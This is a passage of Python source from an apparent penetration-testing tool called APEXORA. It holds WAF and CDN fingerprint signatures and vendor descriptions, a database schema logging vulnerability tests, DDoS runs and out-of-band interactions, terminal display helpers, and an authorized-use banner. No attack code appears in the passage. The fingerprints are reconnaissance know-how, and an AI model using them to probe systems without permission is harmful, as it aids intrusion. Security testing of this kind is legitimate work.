"KS-WAF":(["x-ks-waf"],["kswaf"],["ks-waf","knownsec"],"KnownSec","Chinese WAF","VERY HIGH"),
"Kemp LoadMaster":(["server:kemp"],["kemp"],["kemp loadmaster"],"Kemp","ADC+WAF","VERY HIGH"),
"KeyCDN":(["server:keycdn"],["keycdn"],["keycdn"],"KeyCDN","CDN","HIGH"),
"LiteSpeed":(["server:litespeed"],["litespeed"],["litespeed technologies"],"LiteSpeed","Web Server+WAF","HIGH"),
"ModSecurity":(["server:mod_security","x-mod-security"],[],["mod_security","not acceptable","modsecurity"],"Trustwave","Open-Source WAF","HIGH"),
"NAXSI":(["x-data-origin:naxsi/waf","server:naxsi/waf"],[],["blocked by naxsi"],"NBS","Open-Source WAF","VERY HIGH"),
"NSFocus":(["server:nsfocus"],[],["nsfocus"],"NSFOCUS","Chinese WAF","VERY HIGH"),
"NetScaler":(["via:ns-cache","server:netscaler"],["citrix_ns_id","nsc_"],["netscaler"],"Citrix","ADC+WAF","HIGH"),
"OpenResty":(["server:openresty"],[],["openresty"],"OpenResty","Proxy","HIGH"),
"Oracle Cloud WAF":(["server:oracle"],["OAM_ID"],["oracle cloud"],"Oracle","Cloud WAF","HIGH"),
"Palo Alto NGFW":(["server:paloalto"],["paloalto"],["palo alto networks"],"Palo Alto","NGFW","VERY HIGH"),
"PerimeterX":(["x-px"],["_px"],["perimeterx"],"PerimeterX","Bot Management","VERY HIGH"),
"Qcloud":(["x-tencent","server:tencent"],["tencent"],["tencent cloud"],"Tencent","Cloud WAF","HIGH"),
"Qiniu":(["server:qiniu"],["qiniu"],["qiniu"],"Qiniu","CDN","HIGH"),
"Qrator":(["server:qrator"],["qrator"],["qrator"],"Qrator","Russian WAF","VERY HIGH"),
"Reblaze":(["x-reblaze","server:reblaze secure web gateway"],["rbz","rbzid"],["reblaze"],"Reblaze","Cloud WAF","VERY HIGH"),
"Safedog":(["server:safedog","waf:2.0"],["safedog"],["safedog","安全狗"],"Safedog","Chinese WAF","VERY HIGH"),
"SafeLine":(["server:safeline"],["safeline"],["safeline","雷池"],"Chaitin","Modern WAF","VERY HIGH"),
"SecKing":([],[],["seckingwaf"],"SecKing","Chinese WAF","VERY HIGH"),
"SecureSphere":(["server:imperva"],["secureSphere"],["imperva securesphere"],"Imperva","On-Prem WAF","VERY HIGH"),
"Sitelock TrueShield":([],[],["sitelock.com"],"Sitelock","Cloud WAF","HIGH"),
"Sophos UTM":([],[],["powered by utm web protection"],"Sophos","UTM+WAF","VERY HIGH"),
"Squid":(["server:squid"],[],["squid"],"Squid","Proxy","HIGH"),
"StackPath":(["x-stackpath"],["stackpath"],["stackpath"],"StackPath","CDN+WAF","VERY HIGH"),
"Sucuri CloudProxy":(["x-sucuri-id","x-sucuri-cache","server:sucuri"],["sucuri_cloudproxy_uuid"],["sucuri website firewall"],"Sucuri","Cloud WAF","VERY HIGH"),
"UEWaf":(["server:uewaf"],[],["/uewaf_deny_pages/"],"UCloud","Chinese WAF","VERY HIGH"),
"Wallarm":(["server:wallarm","server:nginx-wallarm"],["wallarm"],["wallarm"],"Wallarm","API Security","VERY HIGH"),
"WatchGuard":(["server:watchguard"],[],["watchguard firewall"],"WatchGuard","NGFW","VERY HIGH"),
"WebKnight":(["server:webknight"],["webknight"],["webknight"],"AQTRONIX","IIS WAF","VERY HIGH"),
"Wordfence":([],["wfvt_","wordfence_verifiedhuman"],["wordfence"],"Defiant","WP WAF","VERY HIGH"),
"Zscaler":(["server:zscaler"],["zscaler"],["zscaler"],"Zscaler","ZTNA","VERY HIGH"),
"Apache":(["server:apache"],[],["apache"],"Apache","Web Server","LOW"),
"IIS":(["server:microsoft-iis"],[],["microsoft-iis"],"Microsoft","Web Server","LOW"),
"Nginx":(["server:nginx"],[],["nginx"],"F5","Web Server","LOW"),
"HAProxy":(["server:haproxy"],[],["haproxy"],"HAProxy","Load Balancer","HIGH"),
"Kong Gateway":(["server:kong"],[],["kong"],"Kong","API Gateway","HIGH"),
"Traefik":(["server:traefik"],[],["traefik"],"Traefik","Proxy","HIGH"),
"Caddy":(["server:caddy"],[],["caddy"],"Caddy","Web Server","LOW"),
"Anubis":(["server:anubis"],["anubis"],["anubis","techaro"],"Techaro","Anti-bot WAF","VERY HIGH"),
"Astra":(["server:astra"],["astra"],["astra security","czar securities"],"Czar Securities","Cloud WAF","VERY HIGH"),
"Azion Edge Firewall":(["server:azion"],["azion"],["azion edge firewall"],"Azion","Edge WAF","HIGH"),
"Barikode":(["server:barikode"],["barikode"],["barikode"],"Ethic Ninja","PHP WAF","VERY HIGH"),
"Baffin Bay":(["server:baffin bay"],["baffin"],["baffin bay","mastercard"],"Mastercard","Cloud WAF","VERY HIGH"),
"Bekchy":(["server:bekchy"],["bekchy"],["bekchy"],"Faydata","Cloud WAF","VERY HIGH"),
"Beluga CDN":(["server:beluga"],["beluga"],["beluga cdn"],"Beluga","CDN","HIGH"),
"BinarySec":(["server:binarysec"],["binarysec"],["binarysec"],"BinarySec","WAF","VERY HIGH"),
"BlockDoS":(["server:blockdos"],["blockdos"],["blockdos"],"BlockDoS","DDoS+WAF","VERY HIGH"),
"Bluedon":(["server:bluedon"],["bluedon"],["bluedon"],"Bluedon IST","Chinese WAF","VERY HIGH"),
"BulletProof Security Pro":(["server:bulletproof"],["bulletproof"],["bulletproof security"],"AITpro","WP WAF","VERY HIGH"),
"CacheWall":(["server:cachewall"],["cachewall"],["cachewall","varnish"],"Varnish","Cache+WAF","VERY HIGH"),
"CdnNS Application Gateway":(["server:cdnns"],["cdnns"],["cdnns"],"CdnNs/WdidcNet","App Gateway","VERY HIGH"),
"Cloud Protector":(["server:cloud protector"],["cloudprotector"],["cloud protector","rohde & schwarz"],"Rohde & Schwarz","Cloud WAF","VERY HIGH"),
"Cloudbric":(["server:cloudbric"],["cloudbric"],["cloudbric","penta security"],"Penta Security","Cloud WAF","VERY HIGH"),
"Cloudfloor DNS":(["server:cloudfloor"],["cloudfloor"],["cloudfloor"],"Cloudfloor","DNS+WAF","VERY HIGH"),
"CrawlProtect":(["server:crawlprotect"],["crawlprotect"],["crawlprotect"],"CrawlProtect","Anti-scraping","VERY HIGH"),
"DOSarrest":(["server:dosarrest"],["dosarrest"],["dosarrest"],"DOSarrest","DDoS+WAF","VERY HIGH"),
"DynamicWeb":(["server:dynamicweb"],["dynamicweb"],["dynamicweb"],"DynamicWeb","CMS+WAF","HIGH"),
"GreyWizard":(["server:greywizard"],["greywizard"],["greywizard"],"Grey Wizard","Cloud WAF","VERY HIGH"),
"IndusGuard":(["server:indusguard"],["indusguard"],["indusguard","indusface"],"Indusface","Cloud WAF","VERY HIGH"),
"Instart DX":(["server:instart"],["instart"],["instart dx"],"Instart","CDN+WAF","VERY HIGH"),
"Malcare":(["server:malcare"],["malcare"],["malcare"],"Inactiv","WP Security","VERY HIGH"),
"MaxCDN":(["server:maxcdn"],["maxcdn"],["maxcdn"],"MaxCDN","CDN","HIGH"),
"Mission Control Shield":(["server:mission control"],["missioncontrol"],["mission control application shield"],"Mission Control","Cloud WAF","VERY HIGH"),
"NevisProxy":(["server:nevisproxy"],["nevisproxy"],["nevisproxy"],"AdNovum","Swiss WAF","VERY HIGH"),
"Newdefend":(["server:newdefend"],["newdefend"],["newdefend"],"Newdefend","Chinese WAF","VERY HIGH"),
"NexusGuard":(["server:nexusguard"],["nexusguard"],["nexusguard firewall"],"NexusGuard","DDoS+WAF","VERY HIGH"),
"NinjaFirewall":(["server:ninjafirewall"],["ninjafirewall"],["ninjafirewall"],"NinTechNet","WP WAF","VERY HIGH"),
"NullDDoS":(["server:nullddos"],["nullddos"],["nullddos protection"],"NullDDoS","DDoS","VERY HIGH"),
"OnMessage Shield":(["server:onmessage"],["onmessage"],["onmessage shield","blackbaud"],"BlackBaud","Cloud WAF","VERY HIGH"),
"PentaWAF":(["server:pentawaf"],["pentawaf"],["pentawaf"],"Penta Security","WAF","VERY HIGH"),
"PowerCDN":(["server:powercdn"],["powercdn"],["powercdn"],"PowerCDN","CDN","HIGH"),
"Profense":(["server:profense"],["profense"],["profense","armorlogic"],"ArmorLogic","WAF","VERY HIGH"),
"Puhui":(["server:puhui"],["puhui"],["puhui"],"Puhui","Chinese WAF","VERY HIGH"),
"Radware Cloud":(["server:radware"],["radware"],["radware cloud"],"Radware","Cloud WAF","VERY HIGH"),
"Reflected Networks":(["server:reflected"],["reflected"],["reflected networks"],"Reflected Networks","Cloud WAF","VERY HIGH"),
"Scutum":(["server:scutum"],["scutum"],["scutum","secure sky"],"Secure Sky Technology","Cloud WAF","VERY HIGH"),
"SecureIIS":(["server:secureiis"],["secureiis"],["secureiis","eeye"],"eEye","IIS WAF","VERY HIGH"),
"ServerDefender":(["server:serverdefender"],["serverdefender"],["serverdefender"],"Port80","IIS WAF","VERY HIGH"),
"Tencent WAF":(["server:tencent-waf"],["tencentwaf"],["tencent waf"],"Tencent","Cloud WAF","VERY HIGH"),
"ThreatX":(["server:threatx"],["threatx"],["threatx"],"A10 Networks","Behavioral WAF","VERY HIGH"),
"Trustwave ModSecurity":(["server:trustwave"],["trustwave"],["trustwave modsecurity"],"Trustwave","Managed WAF","VERY HIGH"),
"URLScan":(["server:urlscan"],["urlscan"],["urlscan","microsoft"],"Microsoft","URL Scanner","HIGH"),
"Vercel WAF":(["server:vercel"],["vercel"],["vercel waf"],"Vercel","Edge WAF","VERY HIGH"),
"WebARX":(["server:webarx"],["webarx"],["webarx"],"WebARX","WP WAF","VERY HIGH"),
"WebRay":(["server:webray"],["webray"],["webray"],"WebRay","Chinese WAF","VERY HIGH"),
"West263CDN":(["server:west263"],["west263"],["west263cdn"],"West263","Chinese CDN","HIGH"),
"WPMU DEV":(["server:wpmu"],["wpmu"],["wpmu dev"],"WPMU DEV","WP WAF","VERY HIGH"),
"XLabs Security":(["server:xlabs"],["xlabs"],["xlabs security waf"],"XLabs","Cloud WAF","VERY HIGH"),
"XuanWuDun":(["server:xuanwudun"],["xuanwudun"],["xuanwudun"],"XuanWuDun","Chinese WAF","VERY HIGH"),
"Yundun":(["server:yundun"],["yundun"],["yundun","baidu"],"Baidu","Cloud WAF","VERY HIGH"),
"Yunsuo":(["server:yunsuo"],["yunsuo"],["yunsuo"],"Yunsuo","Chinese WAF","VERY HIGH"),
"YXLink":(["server:yxlink"],["yxlink"],["yxlink"],"YXLink","Chinese WAF","VERY HIGH"),
"ZenEdge":(["server:zenedge"],["zenedge"],["zenedge"],"ZenEdge","Cloud WAF","VERY HIGH"),
}

WAF_DESCRIPTIONS = {
"360PanYun": "360's cloud WAF/CDN. Used for website security and acceleration, primarily for Chinese websites.",
"360WangZhanBao": "360's cloud website protection. Provides WAF, DDoS mitigation, and CDN for Chinese sites.",
"ACE XML Gateway": "Cisco's XML/API gateway. Used for schema validation and message-level security on XML/SOAP APIs.",
"ASP.NET": "Microsoft's application framework, not a WAF. Fingerprinted for stack identification.",
"ASPA Firewall": "Enterprise application firewall. Used for L7 policy enforcement in regulated environments.",
"AWS ELB": "AWS Elastic Load Balancer. Distributes traffic and provides basic L7 health checking.",
"AWS WAF": "AWS's managed L7 firewall. Filters HTTP requests against SQLi, XSS, and custom rules for CloudFront/ALB.",
"AWS Shield": "AWS's managed DDoS protection. Absorbs volumetric attacks at L3/L4.",
"Akamai": "Enterprise CDN and edge WAF. Used for large-scale content delivery, DDoS scrubbing, and API protection.",
"Kona SiteDefender": "Akamai's enterprise WAF. Provides deep L7 inspection, bot mitigation, and PCI compliance.",
"AliYunDun": "Alibaba Cloud's security shield. DDoS + WAF + host protection for Alibaba Cloud workloads.",
"Airlock": "Swiss enterprise WAF (Ergon). Used for strict application-layer protection in European enterprises.",
"Alert Logic": "Cloud WAF + IDS/IPS. Used for hybrid cloud threat detection and compliance.",
"Anquanbao": "Chinese cloud WAF. Used for website protection and acceleration in China.",
"AppWall": "Radware's enterprise WAF. Used for behavioral analysis and L7 attack mitigation.",
"Armor Defense": "Managed cloud security + WAF. Used for compliance-focused cloud workloads.",
"ArvanCloud": "Iranian CDN + WAF + DNS. Used for regional content delivery and security.",
"Azure App Gateway": "Azure's L7 load balancer with integrated WAF (OWASP CRS). Used for Azure-hosted apps.",
"Azure Front Door": "Microsoft's global CDN + WAF + acceleration. Used for multi-region Azure deployments.",
"BIG-IP APM": "F5 Access Policy Manager. Used for SSL VPN and identity-aware access control.",
"BIG-IP ASM": "F5's enterprise application security manager. Deep L7 policy enforcement and PCI compliance.",
"BIG-IP LTM": "F5 Local Traffic Manager. Load balancing and SSL offload, not strictly WAF.",
"F5 Silverline": "F5's cloud-delivered WAF/DDoS. Used for offloading security from on-prem appliances.",
"Trafficshield": "F5's WAF module. Used for L7 filtering on BIG-IP platforms.",
"Barracuda": "Hardware WAF appliance. Used for email/web security and L7 protection in SMB/enterprise.",
"BitNinja": "Server-level security for hosting providers. WAF + malware + IP reputation.",
"CacheFly": "Global CDN. Used for edge delivery and basic DDoS absorption.",
"ChinaCache": "Chinese CDN. Used for content delivery within China.",
"Chuang Yu Shield": "KnownSec's cloud WAF. Used for Chinese website protection and threat intelligence.",
"Cloudflare": "Global CDN + WAF. Used for DDoS mitigation, bot management, TLS termination, and managed WAF rules.",
"Cloudfront": "AWS's CDN. Used for edge caching and TLS termination.",
"Comodo cWatch": "Cloud WAF + SIEM. Used for SMB website protection and malware scanning.",
"DDoS-GUARD": "Russian CDN + DDoS + WAF. Used for volumetric attack absorption.",
"DataPower": "IBM's XML/API gateway. Used for message-level security and schema validation.",
"DenyALL": "French enterprise WAF. Used for L7 protection in European enterprises (now UBIKA).",
"Distil": "Bot management and scraping protection. Used for anti-automation on public sites.",
"DotDefender": "WAF for IIS/Apache. Used for L7 filtering in Windows hosting environments.",
"Edgecast": "Verizon/Edgio CDN. Used for content delivery and edge security.",
"Envoy": "Service mesh proxy. Used for L7 routing and policy in microservices.",
"Fastly": "Edge cloud CDN with custom WAF logic. Used for real-time caching and VCL-based security.",
"FortiGate": "Fortinet's NGFW. Used for L3-L7 filtering, IPS, VPN, and application control.",
"FortiGuard": "Fortinet's threat-intel/WAF subscription. Backs FortiGate/FortiWeb with updated signatures.",
"FortiWeb": "Fortinet's enterprise WAF appliance. L7 inspection, bot mitigation, and API protection.",
"Google Cloud Armor": "GCP's edge WAF and DDoS protection. Used for HTTP(S) load balancer security.",
"Huawei Cloud FW": "Huawei Cloud's cloud-native firewall/WAF. Used for Huawei Cloud workloads.",
"Imunify360": "CloudLinux's server-level security. WAF + malware + patch management for shared hosting.",
"Incapsula": "Imperva's cloud WAF. Used for bot mitigation, DDoS, and API protection.",
"Jiasule": "Chinese CDN + WAF. Used for website acceleration and security in China.",
"KS-WAF": "KnownSec's Chinese WAF. Used for L7 protection and threat intelligence.",
"Kemp LoadMaster": "ADC + WAF for SMB/enterprise. Used for load balancing and basic L7 filtering.",
"KeyCDN": "Performance-focused CDN. Used for edge delivery and basic security.",
"LiteSpeed": "High-performance web server with WAF plugin. Used for PHP hosting and L7 filtering.",
"ModSecurity": "Open-source WAF engine (Apache/Nginx/IIS) with OWASP CRS. Self-hosted L7 filtering.",
"NAXSI": "Nginx-based open-source WAF. Used for whitelist-based L7 filtering.",
"NSFocus": "Chinese enterprise WAF/DDoS. Used for L7 protection in Chinese enterprises.",
"NetScaler": "Citrix ADC + WAF. Used for load balancing, SSL offload, and L7 protection.",
"OpenResty": "Nginx + LuaJIT. Often paired with WAF rules (lua-resty-waf) for custom filtering.",
"Oracle Cloud WAF": "Oracle Cloud's edge WAF. Used for OCI-hosted application security.",
"Palo Alto NGFW": "Enterprise NGFW. Used for app-ID, threat prevention, and L3-L7 filtering.",
"PerimeterX": "Bot management and anti-automation (now HUMAN Security). Used for stopping credential stuffing and scraping.",
"Qcloud": "Tencent Cloud's WAF/CDN. Used for Chinese cloud workloads.",
"Qiniu": "Chinese CDN + storage. Used for content delivery.",
"Qrator": "Russian DDoS/WAF provider. Used for volumetric attack absorption.",
"Reblaze": "Cloud WAF with behavioral bot detection. Used for API and web app protection.",
"Safedog": "Chinese server-side security and WAF. Used for web hosting protection.",
"SafeLine": "Chaitin's modern open-source WAF. Used for self-hosted L7 protection (Docker/Linux/K8s).",
"SecKing": "Chinese WAF. Used for L7 protection.",
"SecureSphere": "Imperva's on-prem enterprise WAF. Used for database security and L7 policy enforcement.",
"Sitelock TrueShield": "Cloud WAF for small business/WordPress. Used for malware cleanup and L7 filtering.",
"Sophos UTM": "Unified threat management. Firewall + WAF + AV for SMB/enterprise.",
"Squid": "Caching/forward proxy. Used for traffic mediation, not strictly WAF.",
"StackPath": "CDN + WAF + DDoS. Used for edge security and content delivery.",
"Sucuri CloudProxy": "Website firewall + CDN. Very common on WordPress; includes malware cleanup.",
"UEWaf": "UCloud's Chinese WAF. Used for L7 protection in UCloud environments.",
"Wallarm": "API security + WAF. Used for ML-based detection of API abuse and injection attacks.",
"WatchGuard": "NGFW/UTM appliance. Used for network security and L7 filtering.",
"WebKnight": "IIS-based open-source WAF (AQTRONIX). Used for Windows hosting L7 filtering.",
"Wordfence": "WordPress-specific WAF + malware scanner. Very common on WP sites.",
"Zscaler": "Zero-trust cloud security proxy (ZTNA). Used for inline inspection and access control.",
"Apache": "General-purpose HTTP server. Fingerprinted for stack identification.",
"IIS": "Microsoft's web server. Fingerprinted for stack identification.",
"Nginx": "Reverse proxy + web server. Fingerprinted for stack identification.",
"HAProxy": "High-performance TCP/HTTP load balancer. Sometimes with ACL-based filtering.",
"Kong Gateway": "API gateway. Used for auth, rate limiting, and plugins (can run WAF plugins).",
"Traefik": "Modern reverse proxy. Used for auto-discovery and middleware.",
"Caddy": "Auto-TLS web server. Fingerprinted for stack identification.",
"Anubis": "Techaro's anti-bot WAF. Used for blocking automated scraping and credential stuffing.",
"Astra": "Czar Securities' cloud WAF. Used for automated vulnerability patching and L7 protection.",
"Azion Edge Firewall": "Azion's edge WAF. Used for content delivery and security at the edge.",
"Barikode": "Ethic Ninja's PHP WAF. Used for protecting PHP frameworks (Laravel, WordPress, etc.) and virtual patching.",
"Baffin Bay": "Mastercard's cloud WAF. Used for enterprise payment and API security.",
"Bekchy": "Faydata's cloud WAF. Used for website protection.",
"Beluga CDN": "CDN provider. Used for edge delivery.",
"BinarySec": "WAF appliance. Used for L7 filtering.",
"BlockDoS": "DDoS + WAF. Used for volumetric attack absorption and L7 filtering.",
"Bluedon": "Chinese WAF vendor. Used for L7 protection in Chinese enterprises.",
"BulletProof Security Pro": "AITpro's WP WAF. Used for WordPress security and firewall rules.",
"CacheWall": "Varnish-based cache + WAF for cPanel. Used for shared hosting performance and security.",
"CdnNS Application Gateway": "App gateway. Used for L7 routing and security.",
"Cloud Protector": "Rohde & Schwarz's SaaS WAF. Used for European cloud application protection with GDPR compliance.",
"Cloudbric": "Penta Security's cloud WAF. Used for SECaaS web security, bot mitigation, and DDoS defense.",
"Cloudfloor DNS": "DNS + WAF service. Used for managed DNS and L7 protection.",
"CrawlProtect": "Anti-scraping WAF. Used for blocking content scrapers and bots.",
"DOSarrest": "DDoS + WAF. Used for volumetric attack mitigation.",
"DynamicWeb": "CMS + WAF. Used for content management with built-in security.",
"GreyWizard": "Cloud WAF with ML. Used for managed security, bot mitigation, and DDoS protection.",
"IndusGuard": "Indusface's cloud WAF. Used for managed application security and DDoS mitigation.",
"Instart DX": "CDN + WAF. Used for edge delivery and security.",
"Malcare": "Inactiv's WP security. Used for malware scanning and firewall rules.",
"MaxCDN": "CDN provider. Used for content delivery.",
"Mission Control Shield": "Cloud WAF. Used for application security and compliance.",
"NevisProxy": "AdNovum's Swiss WAF. Used for secure authentication and L7 protection.",
"Newdefend": "Chinese WAF. Used for website protection.",
"NexusGuard": "DDoS + WAF. Used for volumetric attack absorption and L7 filtering.",
"NinjaFirewall": "NinTechNet's WP WAF. Used for WordPress firewall rules and malware protection.",
"NullDDoS": "DDoS protection. Used for volumetric attack absorption.",
"OnMessage Shield": "BlackBaud's cloud WAF. Used for application security in education/nonprofit sectors.",
"PentaWAF": "Penta Security's WAF. Used for L7 protection and bot mitigation.",
"PowerCDN": "CDN provider. Used for content delivery.",
"Profense": "ArmorLogic's WAF. Used for L7 filtering and PCI compliance.",
"Puhui": "Chinese WAF. Used for website protection.",
"Radware Cloud": "Radware's cloud WAF. Used for behavioral analysis and L7 attack mitigation.",
"Reflected Networks": "Cloud WAF. Used for website security and CDN.",
"Scutum": "Secure Sky Technology's Japanese cloud WAF. Used for managed website protection with low operational overhead.",
"SecureIIS": "eEye's IIS WAF. Used for Windows hosting L7 filtering.",
"ServerDefender": "Port80's IIS WAF. Used for Windows hosting security.",
"Tencent WAF": "Tencent Cloud's WAF. Used for Chinese cloud workloads.",
"ThreatX": "A10 Networks' behavioral WAF. Used for real-time attack detection and SOC-managed protection.",
"Trustwave ModSecurity": "Trustwave's managed ModSecurity. Used for L7 filtering with CRS rules.",
"URLScan": "Microsoft's URL scanner. Used for safe link inspection, not a WAF.",
"Vercel WAF": "Vercel's edge WAF. Used for serverless/edge application protection.",
"WebARX": "WP WAF. Used for WordPress security and vulnerability patching.",
"WebRay": "Chinese WAF. Used for website protection.",
"West263CDN": "Chinese CDN. Used for content delivery in China.",
"WPMU DEV": "WP WAF. Used for WordPress security and performance.",
"XLabs Security": "Cloud WAF. Used for L7 protection and bot mitigation.",
"XuanWuDun": "Chinese WAF. Used for website protection.",
"Yundun": "Baidu's cloud WAF. Used for Chinese cloud workloads.",
"Yunsuo": "Chinese WAF. Used for website protection.",
"YXLink": "Chinese WAF. Used for L7 protection.",
"ZenEdge": "Cloud WAF. Used for edge security and DDoS mitigation.",
}

SQL_SCHEMA = """
CREATE TABLE IF NOT EXISTS scans (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_url TEXT,
    ip TEXT,
    status INTEGER,
    server TEXT,
    http_status INTEGER,
    response_ms REAL,
    body_size INTEGER,
    detected_json TEXT,
    headers_json TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE TABLE IF NOT EXISTS vuln_tests (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_url TEXT,
    category TEXT,
    payload_count INTEGER,
    findings_count INTEGER,
    criticality TEXT,
    findings_json TEXT,
    duration_ms REAL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE TABLE IF NOT EXISTS ddos_runs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_url TEXT,
    modules TEXT,
    duration_s REAL,
    intensity TEXT,
    availability_pct REAL,
    classification TEXT,
    telemetry_json TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE TABLE IF NOT EXISTS oob_interactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_url TEXT,
    category TEXT,
    token TEXT,
    source_ip TEXT,
    headers_json TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE TABLE IF NOT EXISTS bulk_runs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    category TEXT,
    targets_json TEXT,
    results_json TEXT,
    duration_ms REAL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_scans_target ON scans(target_url);
CREATE INDEX IF NOT EXISTS idx_tests_target ON vuln_tests(target_url);
CREATE INDEX IF NOT EXISTS idx_tests_category ON vuln_tests(category);
CREATE INDEX IF NOT EXISTS idx_ddos_target ON ddos_runs(target_url);
CREATE INDEX IF NOT EXISTS idx_oob_token ON oob_interactions(token);
"""

def _c(code, s):
    if TTY:
        return f"{code}{s}{C_RESET}"
    return s

def _bold(s):    return _c(C_BOLD, s)
def _dim(s):     return _c(C_DIM, s)
def _red(s):     return _c(C_RED, s)
def _grn(s):     return _c(C_GRN, s)
def _yel(s):     return _c(C_YEL, s)
def _blu(s):     return _c(C_BLU, s)
def _mag(s):     return _c(C_MAG, s)
def _cyn(s):     return _c(C_CYN, s)
def _wht(s):     return _c(C_WHT, s)

_SPINNER_FRAMES = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]

class Spinner:
    def __init__(self, msg):
        self.msg = msg
        self._stop = threading.Event()
        self._thread = None
        self._idx = 0
    def __enter__(self):
        if TTY:
            self._thread = threading.Thread(target=self._run, daemon=True)
            self._thread.start()
        else:
            sys.stdout.write(f"[*] {self.msg}\n")
            sys.stdout.flush()
        return self
    def _run(self):
        while not self._stop.is_set():
            frame = _SPINNER_FRAMES[self._idx % len(_SPINNER_FRAMES)]
            self._idx += 1
            sys.stdout.write(f"\r{_cyn(frame)} {self.msg}")
            sys.stdout.flush()
            time.sleep(0.08)
    def __exit__(self, *a):
        if TTY:
            self._stop.set()
            if self._thread:
                self._thread.join(timeout=0.5)
            sys.stdout.write("\r\033[K")
            sys.stdout.flush()

def progress_bar(label, current, total, width=40, color=C_GRN):
    if total <= 0:
        return
    pct = current / total
    filled = int(width * pct)
    bar = "█" * filled + "░" * (width - filled)
    if TTY:
        sys.stdout.write(f"\r  {_bold(label)} {_c(color, bar)} {int(pct*100)}% ({current}/{total})")
        sys.stdout.flush()
    if current >= total:
        if TTY:
            sys.stdout.write("\n")
            sys.stdout.flush()

def hline(ch="─", width=78, color=C_CYN):
    print(_c(color, ch * width))

def box(title, lines, color=C_CYN):
    width = 78
    print(_c(color, "╔" + "═" * (width - 2) + "╗"))
    if title:
        pad = width - 4 - len(title)
        print(_c(color, "║ ") + _bold(_c(color, title)) + " " * max(0, pad) + _c(color, " ║"))
        print(_c(color, "╠" + "═" * (width - 2) + "╣"))
    for line in lines:
        visible = re.sub(r"\033\[[0-9;]*m", "", line)
        pad = width - 3 - len(visible)
        print(_c(color, "║ ") + line + " " * max(0, pad) + _c(color, " ║"))
    print(_c(color, "╚" + "═" * (width - 2) + "╝"))

def severity_badge(sev):
    sev = (sev or "INFO").upper()
    if sev == "CRITICAL":
        return _c(C_BG_RED + C_WHT + C_BOLD, " CRITICAL ")
    if sev == "HIGH":
        return _c(C_RED + C_BOLD, " HIGH ")
    if sev == "MEDIUM":
        return _c(C_YEL + C_BOLD, " MEDIUM ")
    if sev == "LOW":
        return _c(C_BLU, " LOW ")
    if sev == "ERROR":
        return _c(C_MAG + C_BOLD, " ERROR ")
    return _c(C_CYN, " INFO ")

def step_header(step, title, color=C_CYN):
    print()
    width = 78
    left = f"── {step} ── {title} "
    right = "─" * max(0, width - len(left) - 1)
    print(_c(color, "╭" + left + right + "╮"))

def step_footer(color=C_CYN):
    print(_c(color, "╰" + "─" * 77 + "╯"))

def flow_diagram(steps, color=C_BLU):
    print()
    n = len(steps)
    for i, label in enumerate(steps):
        arrow = "──▶ " if i == 0 else "──▶ "
        if i == 0:
            print(_c(color, f"  ┌──▶ {label}"))
        else:
            print(_c(color, f"  │    {arrow}{label}"))
    print(_c(color, "  ═══ END ═══"))

def finding_block(idx, f):
    sev = f.get("severity", "INFO")
    type_ = f.get("type", "unknown")
    desc = f.get("description", "")
    payload = f.get("payload", "")
    evidence = f.get("evidence", "")
    remedy = f.get("remediation", "")
    mitre = f.get("mitre", "")

    print()
    print(_c(C_CYN, "  ╭─ Finding #" + str(idx) + " " + "─" * 55))
    print(_c(C_CYN, "  │ ") + severity_badge(sev) + "  " + _bold(type_))
    if desc:
        print(_c(C_CYN, "  │ ") + _dim("what: ") + str(desc)[:300])
    if payload:
        print(_c(C_CYN, "  │ ") + _dim("with: ") + _yel(str(payload)[:300]))
    if evidence:
        print(_c(C_CYN, "  │ ") + _dim("evidence: ") + str(evidence)[:300])
    if remedy:
        print(_c(C_CYN, "  │ ") + _dim("fix: ") + _grn(remedy))
    if mitre:
        print(_c(C_CYN, "  │ ") + _dim("mitre: ") + _blu(mitre))
    print(_c(C_CYN, "  ╰" + "─" * 66))

def _center(text, width):
    visible = re.sub(r"\033\[[0-9;]*m", "", text)
    if len(visible) >= width:
        return text
    left = (width - len(visible)) // 2
    right = width - len(visible) - left
    return " " * left + text + " " * right

_APEXORA_BANNER = [
    "▄▀█ █▀█ █▀▀ ▀▄▀ █▀█ █▀█ ▄▀█",
    "█▀█ █▀▀ ██▄ █░█ █▄█ █▀▄ █▀█",
]

_TITLE_LINE = "MULTI-LAYER FIREWALL ANALYSIS · OFFENSIVE & DEFENSIVE SECURITY INTELLIGENCE"
_TITLE_LINE2 = "ATTACK-SURFACE DISCOVERY & ADVANCED PENETRATION TESTING FRAMEWORK"

_WARNING_TEXT = (
    "AUTHORIZED TESTING AND EDUCATIONAL RESEARCH ONLY. APEXORA IS A SECURITY ANALYSIS FRAMEWORK. "
    "USE ONLY AGAINST SYSTEMS YOU OWN OR HAVE WRITTEN PERMISSION TO TEST. UNAUTHORIZED USE VIOLATES "
    "COMPUTER FRAUD LAWS INCLUDING CFAA, UK COMPUTER MISUSE ACT, AND LOCAL EQUIVALENTS. "
    "THE AUTHOR ASSUMES NO LIABILITY FOR MISUSE. BY PROCEEDING YOU ACCEPT FULL RESPONSIBILITY. "
    "ALL ACTIONS ARE LOGGED. SCOPE MUST BE DECLARED BEFORE TESTING."
)

def show_banner():
    width = 78
    print()
    print(_c(C_CYN, "╔" + "═" * (width - 2) + "╗"))
    for line in _APEXORA_BANNER:
        print(_c(C_CYN, "║ ") + _bold(_c(C_GRN, _center(line, width - 4))) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "╠" + "═" * (width - 2) + "╣"))
    print(_c(C_CYN, "║ ") + _bold(_cyn(_center(_TITLE_LINE, width - 4))) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "║ ") + _bold(_cyn(_center(_TITLE_LINE2, width - 4))) + _c(C_CYN, " ║"))
    print(_c(C_CYN, "╠" + "═" * (width - 2) + "╣"))
